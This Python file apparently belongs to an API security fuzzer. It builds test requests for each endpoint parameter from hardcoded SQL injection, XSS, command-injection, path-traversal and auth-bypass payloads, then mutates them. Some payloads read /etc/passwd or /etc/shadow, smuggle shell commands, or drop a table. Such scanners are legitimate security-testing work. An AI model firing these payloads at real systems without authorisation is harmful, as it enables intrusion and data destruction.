import random


class AttackGenerator:

    def __init__(self):

        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "' OR ''='",
            "' OR 1=1#",
            "' OR 1=1/*"
        ]

        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math href='javascript:alert(1)>"
        ]

        self.cmd_payloads = [
            "; ls",
            "&& ls",
            "| ls",
            "; cat /etc/passwd",
            "&& whoami",
            "| id",
            "; uname -a",
            "&& ping -c 1 127.0.0.1"
        ]

        self.path_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "/proc/self/environ",
            "../../../../../../etc/shadow",
            "..%2f..%2f..%2fetc%2fpasswd"
        ]

        self.auth_bypass = [
            "",
            "null",
            "admin",
            "administrator",
            "' OR 1=1--",
            "' OR 'admin'='admin",
            "true",
            "1"
        ]

    def _build_payload(self, param, location, payload, method):
        """
        Convert raw payload into executor-compatible structure
        """

        name = param.get("name")
        loc = param.get("in", location)

        # QUERY PARAM
        if loc == "query":
            return {
                "params": {name: payload}
            }

        # PATH PARAM
        if loc == "path":
            return {
                "path_params": {name: payload}
            }

        # HEADER
        if loc == "header":
            return {
                "headers": {name: str(payload)}
            }

        # BODY (default for POST)
        return {
            "body": {name: payload}
        }

    def generate_for_endpoint(self, endpoint):

        params = endpoint.get("parameters", [])
        method = endpoint.get("method", "GET").upper()

        attacks = []

        payload_groups = [
            self.sql_payloads,
            self.xss_payloads,
            self.cmd_payloads,
            self.path_payloads,
            self.auth_bypass
        ]

        for param in params:

            location = param.get("in", "query")

            for group in payload_groups:
                for payload in group:

                    attack = self._build_payload(
                        param,
                        location,
                        payload,
                        method
                    )

                    attack["__family__"] = group[0]  # tag family loosely
                    attacks.append(attack)

        return attacks


class AdaptiveAttackGenerator:

    def __init__(self):
        self.base = AttackGenerator()

    def expand(self, endpoint):

        base_cases = self.base.generate_for_endpoint(endpoint)

        mutations = [
            lambda x: x + "'",
            lambda x: x + "\"",
            lambda x: x + "--",
            lambda x: x.upper(),
            lambda x: x.lower(),
            lambda x: x.replace(" ", "%20"),
            lambda x: x + "%00",
            lambda x: x + "%0a"
        ]

        expanded = []

        for case in base_cases:
            expanded.append(case)

            # mutate only actual values inside payload
            for key in ["params", "body", "headers", "path_params"]:
                if key in case:
                    for param_name, value in case[key].items():

                        for m in mutations:
                            mutated = dict(case)
                            mutated[key] = dict(case[key])
                            mutated[key][param_name] = m(str(value))
                            expanded.append(mutated)

        random.shuffle(expanded)
        return expanded


def generate_attack_cases(endpoint):
    generator = AdaptiveAttackGenerator()
    return generator.expand(endpoint)